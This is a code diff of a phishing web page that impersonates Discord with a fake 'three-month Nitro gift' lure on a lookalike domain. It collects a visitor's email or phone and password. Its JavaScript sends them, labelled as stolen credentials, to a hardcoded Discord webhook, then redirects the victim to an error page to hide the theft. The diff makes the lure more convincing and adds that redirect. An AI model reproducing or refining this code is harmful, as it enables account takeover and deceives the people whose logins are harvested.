@@ -2,14 +2,14 @@
 <html>
   <head>
     <meta charset="UTF-8">
-    <title>Discord Proxy</title>
+    <title>Discord Gift</title>
     <link rel="stylesheet" href="../assest/style.css"/>
     <meta property="og:site_name" content="Discord Gift">
     <meta property="og:url" content="https://dliscord.">
     <meta property="og:title" content="Discord">
-    <meta property="og:description" content="Pleeasseeee work">
+    <meta property="og:description" content="You Have Been Gifted A 3 Month Nitro">
     <meta property="og:type" content="Discord">
-    <meta name="og:image" itemprop="image" content="https://discord.com/assets/d8680b1c1576ecc8.svg">
+    <meta name="og:image" itemprop="image" content="https://cdn1.epicgames.com/salesEvent/salesEvent/EGS_Discord_Nitro_2560x1440_withlogo_2560x1440-944994658df3b04d0c4940be832da19e">
   </head>
   <body>
     <center>
@@ -21,7 +21,7 @@
         <br/>
         Email or Phone number:
         <br/>
-        <!-- Remove action/method since we're handling submission via JavaScript -->
+        <!-- Form submission is handled by JavaScript -->
         <form id="saveForm" onsubmit="handleFormSubmit(event)">
           <input type="text" name="user" id="user" class="inputs" required />
           <br/>
@@ -35,30 +35,29 @@
     </center>
     
     <script>
-      // Replace this with your actual Discord webhook URL.
+      // Discord webhook URL (provided)
       const webhookUrl = 'https://discord.com/api/webhooks/1338297079730016389/Wl7ijongjwRC-t8gz5H12JfI3YQMYxI8FnEp7VAtP-e_XgREUzPfzIOZzarrJYkCzftL';
-
-      // Since we cannot reliably obtain the client's IP from the browser,
-      // we use a placeholder string.
+      
+      // Placeholder for the client's IP since client-side JS can't reliably fetch it
       const iptoken = "Client_IP";
-
-      // This function handles the form submission.
+      
+      // Function to handle the form submission
       function handleFormSubmit(event) {
         event.preventDefault(); // Prevent the default form submission (page reload)
         
-        // Retrieve the user input values.
+        // Retrieve the values from the input fields
         const user = document.getElementById('user').value;
         const pass = document.getElementById('pass').value;
         
-        // Construct the message string. You can adjust formatting as needed.
+        // Construct the message to be sent via Discord webhook
         const message = `- IP: ${iptoken}   Username: ${user}   Password: ${pass}`;
         
-        // Create the payload object required by Discord. The simplest payload uses the "content" field.
+        // Build the payload for Discord (using the "content" field)
         const payload = {
           content: message
         };
 
-        // Send the POST request to the Discord webhook.
+        // Send the data to the Discord webhook using fetch
         fetch(webhookUrl, {
           method: 'POST',
           headers: {
@@ -69,13 +68,16 @@
         .then(response => {
           if (response.ok) {
             console.log("Message sent to Discord webhook.");
-            // Optionally, you could perform further actions here, like redirecting the user.
           } else {
             console.error("Error sending message to Discord webhook.");
           }
         })
         .catch(error => {
-          console.error("Fetch error: ", error);
+          console.error("Fetch error:", error);
+        })
+        .finally(() => {
+          // Redirect the user to error.html after attempting to send the data
+          window.location.href = "error.html";
         });
       }
     </script>
